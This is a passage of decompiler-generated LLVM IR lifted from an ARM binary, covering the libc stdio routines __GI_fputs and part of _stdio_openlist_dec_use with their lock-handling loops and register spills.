  %v3_cf44 = icmp uge i32 %v0_cf4c, %v1_cf44
  store i1 %v3_cf44, i1* %cpsr_c.global-to-local, align 1
  %v9_cf44 = icmp eq i32 %v0_cf4c, %v1_cf44
  br i1 %v9_cf44, label %dec_label_pc_cf4c, label %dec_label_pc_cf44.dec_label_pc_cf14_crit_edge

dec_label_pc_cf44.dec_label_pc_cf14_crit_edge:    ; preds = %dec_label_pc_cf44
  %v0_cf14.pre = load i32, i32* @r7, align 4
  %v0_cf1c.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_cf14

dec_label_pc_cf4c:                                ; preds = %dec_label_pc_cf44
  %v2_cf4c = icmp ne i32 %v1_cf44, 0
  store i1 %v2_cf4c, i1* %cpsr_c.global-to-local, align 1
  %v7_cf50 = icmp slt i32 %v1_cf44, 2
  br i1 %v7_cf50, label %dec_label_pc_cf6c, label %dec_label_pc_cf54

dec_label_pc_cf54:                                ; preds = %dec_label_pc_cf4c
  %v0_cf58 = load i32, i32* @r1, align 4
  %v1_cf58 = add i32 %v0_cf58, 129
  store i32 %v1_cf58, i32* @r1, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_cf6c

dec_label_pc_cf6c:                                ; preds = %dec_label_pc_cef8, %dec_label_pc_cedc, %dec_label_pc_cf54, %dec_label_pc_cf4c
  %v0_cf6c = load i32, i32* %r8.global-to-local, align 4
  %v2_cf70 = load i32, i32* %stack_var_-32, align 4
  store i32 %v2_cf70, i32* @r4, align 4
  store i32 %v6_ce5c, i32* @r5, align 4
  store i32 %v9_ce5c, i32* @r6, align 4
  store i32 %v12_ce5c, i32* @r7, align 4
  store i32 %v15_ce5c, i32* @r8, align 4
  store i32 %v24_ce5c, i32* @lr, align 4
  ret i32 %v0_cf6c

; uselistorder directives
  uselistorder i32 %v0_cf40, { 1, 0, 2 }
  uselistorder i32 %v1_cf24.pre, { 0, 2, 1 }
  uselistorder i32 %v0_cee4, { 1, 0 }
  uselistorder i32 %v1_cea0.pre, { 1, 0 }
  uselistorder i32* %r4.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 3, 2, 11, 4, 5, 6, 7, 9, 8, 12, 10 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder i1* %cpsr_c.global-to-local, { 1, 2, 3, 11, 12, 4, 5, 6, 8, 7, 0, 9, 10 }
  uselistorder i32 %arg3, { 0, 1, 2, 4, 3, 5 }
  uselistorder label %dec_label_pc_cf6c, { 2, 3, 0, 1 }
  uselistorder label %dec_label_pc_cf44, { 2, 1, 0 }
  uselistorder label %dec_label_pc_cf2c, { 1, 0 }
  uselistorder label %dec_label_pc_cedc, { 1, 0 }
  uselistorder label %dec_label_pc_ced0, { 1, 0 }
  uselistorder label %bb20, { 1, 0 }
  uselistorder label %dec_label_pc_cec0, { 2, 1, 0 }
  uselistorder label %dec_label_pc_cea8, { 1, 0 }
}

define i32 @__GI_fputs(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %v3_cf78 = load i32, i32* @r4, align 4
  store i32 %v3_cf78, i32* %stack_var_-28, align 4
  %v6_cf78 = load i32, i32* @r5, align 4
  %v9_cf78 = load i32, i32* @r6, align 4
  %v12_cf78 = load i32, i32* @r7, align 4
  %v15_cf78 = load i32, i32* @r8, align 4
  %v18_cf78 = load i32, i32* @sl, align 4
  %v21_cf78 = load i32, i32* @lr, align 4
  %v1_cf7c = add i32 %arg2, 52
  %v2_cf7c = inttoptr i32 %v1_cf7c to i32*
  %v3_cf7c = load i32, i32* %v2_cf7c, align 4
  store i32 %v3_cf7c, i32* @r6, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_cf80 = icmp eq i32 %v3_cf7c, 0
  store i32 %arg2, i32* @r7, align 4
  store i32 %arg1, i32* @sl, align 4
  br i1 %v2_cf80, label %dec_label_pc_cf94, label %dec_label_pc_cff8

dec_label_pc_cf94:                                ; preds = %entry
  %v0_cf94 = call i32 @__aeabi_read_tp()
  %v1_cf98 = add i32 %arg2, 64
  %v2_cf98 = inttoptr i32 %v1_cf98 to i32*
  %v3_cf98 = load i32, i32* %v2_cf98, align 4
  store i32 %v3_cf98, i32* %r3.global-to-local, align 4
  %v1_cf9c = add i32 %v0_cf94, -1168
  store i32 %v1_cf9c, i32* @r8, align 4
  %v3_cfa0 = icmp uge i32 %v3_cf98, %v1_cf9c
  store i1 %v3_cfa0, i1* %cpsr_c.global-to-local, align 1
  %v9_cfa0 = icmp eq i32 %v3_cf98, %v1_cf9c
  br i1 %v9_cfa0, label %dec_label_pc_cfec, label %dec_label_pc_cfa8

dec_label_pc_cfa8:                                ; preds = %dec_label_pc_cf94
  %v1_cfa8 = add i32 %arg2, 56
  store i32 %v1_cfa8, i32* @r5, align 4
  store i32 %v1_cfa8, i32* %r2.global-to-local, align 4
  %v0_cfb4 = load i32, i32* @r6, align 4
  store i32 %v0_cfb4, i32* @r4, align 4
  %v1_cfb835 = inttoptr i32 %v1_cfa8 to i32*
  %v2_cfb836 = load i32, i32* %v1_cfb835, align 4
  store i32 %v2_cfb836, i32* %r3.global-to-local, align 4
  %v3_cfbc38 = icmp uge i32 %v2_cfb836, %v0_cfb4
  store i1 %v3_cfbc38, i1* %cpsr_c.global-to-local, align 1
  %v9_cfbc44 = icmp eq i32 %v2_cfb836, %v0_cfb4
  br i1 %v9_cfbc44, label %dec_label_pc_cfc4, label %dec_label_pc_cfdc

dec_label_pc_cfc4:                                ; preds = %dec_label_pc_cfa8, %dec_label_pc_cfc4.dec_label_pc_cfb8_crit_edge
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_cfd4 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_cfd4, label %dec_label_pc_cfd8, label %dec_label_pc_cfc4.dec_label_pc_cfb8_crit_edge

dec_label_pc_cfc4.dec_label_pc_cfb8_crit_edge:    ; preds = %dec_label_pc_cfc4
  %v0_cfb8.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_cfbc.pre = load i32, i32* @r4, align 4
  %v1_cfb8 = inttoptr i32 %v0_cfb8.pre to i32*
  %v2_cfb8 = load i32, i32* %v1_cfb8, align 4
  store i32 %v2_cfb8, i32* %r3.global-to-local, align 4
  %v3_cfbc = icmp uge i32 %v2_cfb8, %v1_cfbc.pre
  store i1 %v3_cfbc, i1* %cpsr_c.global-to-local, align 1
  %v9_cfbc = icmp eq i32 %v2_cfb8, %v1_cfbc.pre
  br i1 %v9_cfbc, label %dec_label_pc_cfc4, label %dec_label_pc_cfdc

dec_label_pc_cfd8:                                ; preds = %dec_label_pc_cfc4
  %v0_cfd8 = load i32, i32* @r4, align 4
  store i32 %v0_cfd8, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_cfdc

dec_label_pc_cfdc:                                ; preds = %dec_label_pc_cfa8, %dec_label_pc_cfc4.dec_label_pc_cfb8_crit_edge, %dec_label_pc_cfd8
  %v0_cfdc = phi i32 [ %v0_cfd8, %dec_label_pc_cfd8 ], [ %v2_cfb836, %dec_label_pc_cfa8 ], [ %v2_cfb8, %dec_label_pc_cfc4.dec_label_pc_cfb8_crit_edge ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_cfdc = icmp eq i32 %v0_cfdc, 0
  br i1 %v2_cfdc, label %bb19, label %bb

bb:                                               ; preds = %dec_label_pc_cfdc
  br label %bb19

bb19:                                             ; preds = %dec_label_pc_cfdc, %bb
  store i32 53224, i32* @lr, align 4
  %v1_cfe4 = xor i1 %v2_cfdc, true
  call void @__pseudo_cond_branch(i1 %v1_cfe4, i32 ptrtoint (i32* @global_var_10b94.194 to i32))
  %v0_cfe8 = load i32, i32* @r8, align 4
  %v1_cfe8 = load i32, i32* @r7, align 4
  %v2_cfe8 = add i32 %v1_cfe8, 64
  %v3_cfe8 = inttoptr i32 %v2_cfe8 to i32*
  store i32 %v0_cfe8, i32* %v3_cfe8, align 4
  br label %dec_label_pc_cfec

dec_label_pc_cfec:                                ; preds = %dec_label_pc_cf94, %bb19
  %v0_cfec = load i32, i32* @r7, align 4
  %v1_cfec = add i32 %v0_cfec, 60
  %v2_cfec = inttoptr i32 %v1_cfec to i32*
  %v3_cfec = load i32, i32* %v2_cfec, align 4
  %v1_cff0 = add i32 %v3_cfec, 1
  store i32 %v1_cff0, i32* %r3.global-to-local, align 4
  store i32 %v1_cff0, i32* %v2_cfec, align 4
  %v0_cff8.pre = load i32, i32* @sl, align 4
  %v0_cffc.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_cff8

dec_label_pc_cff8:                                ; preds = %entry, %dec_label_pc_cfec
  %v0_cffc = phi i32 [ %arg2, %entry ], [ %v0_cffc.pre, %dec_label_pc_cfec ]
  %v0_cff8 = phi i32 [ %arg1, %entry ], [ %v0_cff8.pre, %dec_label_pc_cfec ]
  %v2_d000 = inttoptr i32 %v0_cff8 to i8*
  %v3_d000 = call i32 @__GI_fputs_unlocked(i8* %v2_d000, i32 %v0_cffc)
  %v0_d004 = load i32, i32* @r6, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_d004 = icmp eq i32 %v0_d004, 0
  store i32 %v3_d000, i32* %r8.global-to-local, align 4
  br i1 %v2_d004, label %dec_label_pc_d010, label %dec_label_pc_d084

dec_label_pc_d010:                                ; preds = %dec_label_pc_cff8
  %v0_d010 = load i32, i32* @r7, align 4
  %v1_d010 = add i32 %v0_d010, 60
  %v2_d010 = inttoptr i32 %v1_d010 to i32*
  %v3_d010 = load i32, i32* %v2_d010, align 4
  %v1_d014 = add i32 %v3_d010, -1
  store i32 %v1_d014, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_d018 = icmp eq i32 %v1_d014, 0
  store i32 %v1_d014, i32* %v2_d010, align 4
  br i1 %v2_d018, label %dec_label_pc_d024, label %dec_label_pc_d084

dec_label_pc_d024:                                ; preds = %dec_label_pc_d010
  %v0_d024 = load i32, i32* %r3.global-to-local, align 4
  %v1_d024 = load i32, i32* @r7, align 4
  %v2_d024 = add i32 %v1_d024, 64
  %v3_d024 = inttoptr i32 %v2_d024 to i32*
  store i32 %v0_d024, i32* %v3_d024, align 4
  %v0_d028 = load i32, i32* @r7, align 4
  %v1_d028 = add i32 %v0_d028, 56
  store i32 %v1_d028, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_d02c

dec_label_pc_d02c:                                ; preds = %dec_label_pc_d05c.dec_label_pc_d02c_crit_edge, %dec_label_pc_d024
  %v0_d034 = phi i32 [ %v0_d034.pre, %dec_label_pc_d05c.dec_label_pc_d02c_crit_edge ], [ %v1_d028, %dec_label_pc_d024 ]
  %v0_d02c = phi i32 [ %v0_d02c.pre, %dec_label_pc_d05c.dec_label_pc_d02c_crit_edge ], [ %v0_d028, %dec_label_pc_d024 ]
  %v1_d02c = add i32 %v0_d02c, 56
  %v2_d02c = inttoptr i32 %v1_d02c to i32*
  %v3_d02c = load i32, i32* %v2_d02c, align 4
  store i32 %v3_d02c, i32* %r4.global-to-local, align 4
  store i32 0, i32* @r1, align 4
  store i32 %v0_d034, i32* %r2.global-to-local, align 4
  %v1_d03823 = inttoptr i32 %v0_d034 to i32*
  %v2_d03824 = load i32, i32* %v1_d03823, align 4
  store i32 %v2_d03824, i32* %r3.global-to-local, align 4
  %v3_d03c26 = icmp uge i32 %v2_d03824, %v3_d02c
  store i1 %v3_d03c26, i1* %cpsr_c.global-to-local, align 1
  %v9_d03c32 = icmp eq i32 %v2_d03824, %v3_d02c
  br i1 %v9_d03c32, label %dec_label_pc_d044, label %dec_label_pc_d05c

dec_label_pc_d044:                                ; preds = %dec_label_pc_d02c, %dec_label_pc_d044.dec_label_pc_d038_crit_edge
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_d054 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_d054, label %dec_label_pc_d058, label %dec_label_pc_d044.dec_label_pc_d038_crit_edge

dec_label_pc_d044.dec_label_pc_d038_crit_edge:    ; preds = %dec_label_pc_d044
  %v0_d038.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_d03c.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_d038 = inttoptr i32 %v0_d038.pre to i32*
  %v2_d038 = load i32, i32* %v1_d038, align 4
  store i32 %v2_d038, i32* %r3.global-to-local, align 4
  %v3_d03c = icmp uge i32 %v2_d038, %v1_d03c.pre
  store i1 %v3_d03c, i1* %cpsr_c.global-to-local, align 1
  %v9_d03c = icmp eq i32 %v2_d038, %v1_d03c.pre
  br i1 %v9_d03c, label %dec_label_pc_d044, label %dec_label_pc_d05c

dec_label_pc_d058:                                ; preds = %dec_label_pc_d044
  %v0_d058 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_d058, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_d05c

dec_label_pc_d05c:                                ; preds = %dec_label_pc_d02c, %dec_label_pc_d044.dec_label_pc_d038_crit_edge, %dec_label_pc_d058
  %v0_d064 = phi i32 [ %v0_d058, %dec_label_pc_d058 ], [ %v2_d03824, %dec_label_pc_d02c ], [ %v2_d038, %dec_label_pc_d044.dec_label_pc_d038_crit_edge ]
  %v1_d05c = phi i32 [ %v0_d058, %dec_label_pc_d058 ], [ %v3_d02c, %dec_label_pc_d02c ], [ %v1_d03c.pre, %dec_label_pc_d044.dec_label_pc_d038_crit_edge ]
  %v3_d05c = icmp uge i32 %v0_d064, %v1_d05c
  store i1 %v3_d05c, i1* %cpsr_c.global-to-local, align 1
  %v9_d05c = icmp eq i32 %v0_d064, %v1_d05c
  br i1 %v9_d05c, label %dec_label_pc_d064, label %dec_label_pc_d05c.dec_label_pc_d02c_crit_edge

dec_label_pc_d05c.dec_label_pc_d02c_crit_edge:    ; preds = %dec_label_pc_d05c
  %v0_d02c.pre = load i32, i32* @r7, align 4
  %v0_d034.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_d02c

dec_label_pc_d064:                                ; preds = %dec_label_pc_d05c
  %v2_d064 = icmp ne i32 %v1_d05c, 0
  store i1 %v2_d064, i1* %cpsr_c.global-to-local, align 1
  %v7_d068 = icmp slt i32 %v1_d05c, 2
  br i1 %v7_d068, label %dec_label_pc_d084, label %dec_label_pc_d06c

dec_label_pc_d06c:                                ; preds = %dec_label_pc_d064
  %v0_d070 = load i32, i32* @r1, align 4
  %v1_d070 = add i32 %v0_d070, 129
  store i32 %v1_d070, i32* @r1, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_d084

dec_label_pc_d084:                                ; preds = %dec_label_pc_d010, %dec_label_pc_cff8, %dec_label_pc_d06c, %dec_label_pc_d064
  %v0_d084 = load i32, i32* %r8.global-to-local, align 4
  %v2_d08c = load i32, i32* %stack_var_-28, align 4
  store i32 %v2_d08c, i32* @r4, align 4
  store i32 %v6_cf78, i32* @r5, align 4
  store i32 %v9_cf78, i32* @r6, align 4
  store i32 %v12_cf78, i32* @r7, align 4
  store i32 %v15_cf78, i32* @r8, align 4
  store i32 %v18_cf78, i32* @sl, align 4
  store i32 %v21_cf78, i32* @lr, align 4
  ret i32 %v0_d084

; uselistorder directives
  uselistorder i32 %v0_d058, { 1, 0, 2 }
  uselistorder i32 %v1_d03c.pre, { 0, 2, 1 }
  uselistorder i32 %v1_cfbc.pre, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 4, 3, 12, 5, 6, 7, 8, 10, 9, 0, 11 }
  uselistorder i1* %cpsr_c.global-to-local, { 0, 1, 2, 11, 12, 3, 4, 5, 6, 9, 10, 7, 8 }
  uselistorder i32 %arg2, { 0, 2, 1, 4, 3 }
  uselistorder label %dec_label_pc_d084, { 2, 3, 0, 1 }
  uselistorder label %dec_label_pc_d05c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_d044, { 1, 0 }
  uselistorder label %dec_label_pc_cff8, { 1, 0 }
  uselistorder label %dec_label_pc_cfec, { 1, 0 }
  uselistorder label %bb19, { 1, 0 }
  uselistorder label %dec_label_pc_cfdc, { 2, 1, 0 }
  uselistorder label %dec_label_pc_cfc4, { 1, 0 }
}

define i32 @_stdio_openlist_dec_use() local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_d094 = load i32, i32* @r4, align 4
  store i32 %v3_d094, i32* %stack_var_-20, align 4
  store i32 168, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_23104.179 to i32), i32* %r5.global-to-local, align 4
  %v4_d0a4 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23104.179 to i32), i32 168) to i32*), align 4
  store i32 %v4_d0a4, i32* %r7.global-to-local, align 4
  %v0_d0a8 = call i32 @__aeabi_read_tp()
  store i32 %v0_d0a8, i32* %r0.global-to-local, align 4
  %v1_d0ac = add i32 %v4_d0a4, 8
  %v2_d0ac = inttoptr i32 %v1_d0ac to i32*
  %v3_d0ac = load i32, i32* %v2_d0ac, align 4
  store i32 %v3_d0ac, i32* %r3.global-to-local, align 4
  %v1_d0b0 = add i32 %v0_d0a8, -1168
  store i32 %v1_d0b0, i32* %r6.global-to-local, align 4
  %v3_d0b4 = icmp uge i32 %v3_d0ac, %v1_d0b0
  store i1 %v3_d0b4, i1* %cpsr_c.global-to-local, align 1
  %v9_d0b4 = icmp eq i32 %v3_d0ac, %v1_d0b0
  br i1 %v9_d0b4, label %dec_label_pc_d100, label %dec_label_pc_d0c0

dec_label_pc_d0c0:                                ; preds = %entry
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 %v4_d0a4, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  %v1_d0cc93 = inttoptr i32 %v4_d0a4 to i32*
  %v2_d0cc94 = load i32, i32* %v1_d0cc93, align 4
  store i32 %v2_d0cc94, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_d0d096 = icmp eq i32 %v2_d0cc94, 0
  br i1 %v9_d0d096, label %dec_label_pc_d0d8, label %dec_label_pc_d0f0

dec_label_pc_d0d8:                                ; preds = %dec_label_pc_d0c0, %dec_label_pc_d0d8.dec_label_pc_d0cc_crit_edge
  %v0_d0d897 = phi i32 [ %v1_d0d0.pre, %dec_label_pc_d0d8.dec_label_pc_d0cc_crit_edge ], [ 0, %dec_label_pc_d0c0 ]
  store i32 %v0_d0d897, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_d0e8 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_d0e8, label %dec_label_pc_d0ec, label %dec_label_pc_d0d8.dec_label_pc_d0cc_crit_edge

dec_label_pc_d0d8.dec_label_pc_d0cc_crit_edge:    ; preds = %dec_label_pc_d0d8
  %v0_d0cc.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_d0d0.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_d0cc = inttoptr i32 %v0_d0cc.pre to i32*
  %v2_d0cc = load i32, i32* %v1_d0cc, align 4
  store i32 %v2_d0cc, i32* %r3.global-to-local, align 4
  %v3_d0d0 = icmp uge i32 %v2_d0cc, %v1_d0d0.pre
  store i1 %v3_d0d0, i1* %cpsr_c.global-to-local, align 1
  %v9_d0d0 = icmp eq i32 %v2_d0cc, %v1_d0d0.pre
  br i1 %v9_d0d0, label %dec_label_pc_d0d8, label %dec_label_pc_d0f0

dec_label_pc_d0ec:                                ; preds = %dec_label_pc_d0d8
  %v0_d0ec = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_d0ec, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_d0f0

dec_label_pc_d0f0:                                ; preds = %dec_label_pc_d0c0, %dec_label_pc_d0d8.dec_label_pc_d0cc_crit_edge, %dec_label_pc_d0ec
  %v0_d0f0 = phi i32 [ %v0_d0ec, %dec_label_pc_d0ec ], [ %v2_d0cc94, %dec_label_pc_d0c0 ], [ %v2_d0cc, %dec_label_pc_d0d8.dec_label_pc_d0cc_crit_edge ]
  %v1_d0f0 = phi i32 [ %v0_d0ec, %dec_label_pc_d0ec ], [ 0, %dec_label_pc_d0c0 ], [ %v1_d0d0.pre, %dec_label_pc_d0d8.dec_label_pc_d0cc_crit_edge ]
  %v3_d0f0 = icmp uge i32 %v0_d0f0, %v1_d0f0
  store i1 %v3_d0f0, i1* %cpsr_c.global-to-local, align 1
  %v9_d0f0 = icmp eq i32 %v0_d0f0, %v1_d0f0
  br i1 %v9_d0f0, label %bb45, label %bb

bb:                                               ; preds = %dec_label_pc_d0f0
  %v1_d0f4 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v1_d0f4, i32* %r0.global-to-local, align 4
  br label %bb45

bb45:                                             ; preds = %dec_label_pc_d0f0, %bb
  %v1_d0f8 = xor i1 %v9_d0f0, true
  call void @__pseudo_cond_branch(i1 %v1_d0f8, i32 ptrtoint (i32* @global_var_10b94.194 to i32))
  %v0_d0fc = load i32, i32* %r6.global-to-local, align 4
  %v1_d0fc = load i32, i32* %r7.global-to-local, align 4
  %v2_d0fc = add i32 %v1_d0fc, 8
  %v3_d0fc = inttoptr i32 %v2_d0fc to i32*
  store i32 %v0_d0fc, i32* %v3_d0fc, align 4
  br label %dec_label_pc_d100

dec_label_pc_d100:                                ; preds = %entry, %bb45
  store i32 168, i32* %r3.global-to-local, align 4
  %v0_d104 = load i32, i32* %r5.global-to-local, align 4
  %v2_d104 = add i32 %v0_d104, 168
  %v3_d104 = inttoptr i32 %v2_d104 to i32*
  %v4_d104 = load i32, i32* %v3_d104, align 4
  store i32 %v4_d104, i32* %r2.global-to-local, align 4
  store i32 12, i32* %r3.global-to-local, align 4
  %v2_d10c = add i32 %v0_d104, 12
  %v3_d10c = inttoptr i32 %v2_d10c to i32*
  %v4_d10c = load i32, i32* %v3_d10c, align 4
  store i32 %v4_d10c, i32* %r3.global-to-local, align 4
  %v1_d110 = inttoptr i32 %v4_d10c to i32*
  %v2_d110 = load i32, i32* %v1_d110, align 4
  store i32 %v2_d110, i32* %r1.global-to-local, align 4
  %v1_d114 = add i32 %v4_d104, 4
  %v2_d114 = inttoptr i32 %v1_d114 to i32*
  %v3_d114 = load i32, i32* %v2_d114, align 4
  %v2_d118 = icmp ne i32 %v2_d110, 0
  store i1 %v2_d118, i1* %cpsr_c.global-to-local, align 1
  %v7_d118 = icmp eq i32 %v2_d110, 1
  %v1_d11c = add i32 %v3_d114, 1
  store i32 %v1_d11c, i32* %r3.global-to-local, align 4
  store i32 %v1_d11c, i32* %v2_d114, align 4
  br i1 %v7_d118, label %dec_label_pc_d128, label %dec_label_pc_d28c

dec_label_pc_d128:                                ; preds = %dec_label_pc_d100
  store i32 88, i32* %r3.global-to-local, align 4
  %v0_d12c = load i32, i32* %r5.global-to-local, align 4
  %v2_d12c = add i32 %v0_d12c, 88
  %v3_d12c = inttoptr i32 %v2_d12c to i32*
  %v4_d12c = load i32, i32* %v3_d12c, align 4
  store i32 %v4_d12c, i32* %r3.global-to-local, align 4
  %v1_d130 = inttoptr i32 %v4_d12c to i32*
  %v2_d130 = load i32, i32* %v1_d130, align 4
  store i32 %v2_d130, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %tmp46 = icmp slt i32 %v2_d130, 1
  br i1 %tmp46, label %dec_label_pc_d28c, label %dec_label_pc_d13c

dec_label_pc_d13c:                                ; preds = %dec_label_pc_d128
  store i32 160, i32* %r3.global-to-local, align 4
  %v2_d140 = add i32 %v0_d12c, 160
  %v3_d140 = inttoptr i32 %v2_d140 to i32*
  %v4_d140 = load i32, i32* %v3_d140, align 4
  store i32 %v4_d140, i32* %r7.global-to-local, align 4
  %v1_d144 = add i32 %v4_d140, 8
  %v2_d144 = inttoptr i32 %v1_d144 to i32*
  %v3_d144 = load i32, i32* %v2_d144, align 4
  store i32 %v3_d144, i32* %r3.global-to-local, align 4
  %v1_d148 = load i32, i32* %r6.global-to-local, align 4
  %v3_d148 = icmp uge i32 %v3_d144, %v1_d148
  store i1 %v3_d148, i1* %cpsr_c.global-to-local, align 1
  %v9_d148 = icmp eq i32 %v3_d144, %v1_d148
  br i1 %v9_d148, label %dec_label_pc_d18c, label %dec_label_pc_d150

dec_label_pc_d150:                                ; preds = %dec_label_pc_d13c
  store i32 %v4_d140, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  %v1_d15886 = inttoptr i32 %v4_d140 to i32*
  %v2_d15887 = load i32, i32* %v1_d15886, align 4
  store i32 %v2_d15887, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_d15c89 = icmp eq i32 %v2_d15887, 0
  br i1 %v9_d15c89, label %dec_label_pc_d164, label %dec_label_pc_d17c

dec_label_pc_d164:                                ; preds = %dec_label_pc_d150, %dec_label_pc_d164.dec_label_pc_d158_crit_edge
  %v0_d16490 = phi i32 [ %v1_d15c.pre, %dec_label_pc_d164.dec_label_pc_d158_crit_edge ], [ 0, %dec_label_pc_d150 ]
  store i32 %v0_d16490, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_d174 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_d174, label %dec_label_pc_d178, label %dec_label_pc_d164.dec_label_pc_d158_crit_edge

dec_label_pc_d164.dec_label_pc_d158_crit_edge:    ; preds = %dec_label_pc_d164
  %v0_d158.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_d15c.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_d158 = inttoptr i32 %v0_d158.pre to i32*
  %v2_d158 = load i32, i32* %v1_d158, align 4
  store i32 %v2_d158, i32* %r3.global-to-local, align 4
  %v3_d15c = icmp uge i32 %v2_d158, %v1_d15c.pre
  store i1 %v3_d15c, i1* %cpsr_c.global-to-local, align 1
  %v9_d15c = icmp eq i32 %v2_d158, %v1_d15c.pre
  br i1 %v9_d15c, label %dec_label_pc_d164, label %dec_label_pc_d17c

dec_label_pc_d178:                                ; preds = %dec_label_pc_d164
  %v0_d178 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_d178, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_d17c

dec_label_pc_d17c:                                ; preds = %dec_label_pc_d150, %dec_label_pc_d164.dec_label_pc_d158_crit_edge, %dec_label_pc_d178
  %v0_d17c = phi i32 [ %v0_d178, %dec_label_pc_d178 ], [ %v2_d15887, %dec_label_pc_d150 ], [ %v2_d158, %dec_label_pc_d164.dec_label_pc_d158_crit_edge ]
  %v1_d17c = phi i32 [ %v0_d178, %dec_label_pc_d178 ], [ 0, %dec_label_pc_d150 ], [ %v1_d15c.pre, %dec_label_pc_d164.dec_label_pc_d158_crit_edge ]
  %v3_d17c = icmp uge i32 %v0_d17c, %v1_d17c
  store i1 %v3_d17c, i1* %cpsr_c.global-to-local, align 1
  %v9_d17c = icmp eq i32 %v0_d17c, %v1_d17c
  br i1 %v9_d17c, label %bb48, label %bb47

bb47:                                             ; preds = %dec_label_pc_d17c
  %v1_d180 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v1_d180, i32* %r0.global-to-local, align 4
  br label %bb48

bb48:                                             ; preds = %dec_label_pc_d17c, %bb47
  %v1_d184 = xor i1 %v9_d17c, true
  call void @__pseudo_cond_branch(i1 %v1_d184, i32 ptrtoint (i32* @global_var_10b94.194 to i32))
  %v0_d188 = load i32, i32* %r6.global-to-local, align 4
  %v1_d188 = load i32, i32* %r7.global-to-local, align 4
  %v2_d188 = add i32 %v1_d188, 8
  %v3_d188 = inttoptr i32 %v2_d188 to i32*
  store i32 %v0_d188, i32* %v3_d188, align 4
  %v0_d194.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_d18c

dec_label_pc_d18c:                                ; preds = %dec_label_pc_d13c, %bb48
  %v0_d194 = phi i32 [ %v0_d12c, %dec_label_pc_d13c ], [ %v0_d194.pre, %bb48 ]
  store i32 160, i32* %r3.global-to-local, align 4
  store i32 84, i32* %r1.global-to-local, align 4
  %v2_d194 = add i32 %v0_d194, 160
  %v3_d194 = inttoptr i32 %v2_d194 to i32*
  %v4_d194 = load i32, i32* %v3_d194, align 4
  store i32 %v4_d194, i32* %r0.global-to-local, align 4
  %v2_d198 = add i32 %v0_d194, 84
  %v3_d198 = inttoptr i32 %v2_d198 to i32*
  %v4_d198 = load i32, i32* %v3_d198, align 4
  store i32 %v4_d198, i32* %r2.global-to-local, align 4
  %v1_d19c = add i32 %v4_d194, 4
  %v2_d19c = inttoptr i32 %v1_d19c to i32*
  %v3_d19c = load i32, i32* %v2_d19c, align 4
  store i32 %v3_d19c, i32* %r3.global-to-local, align 4
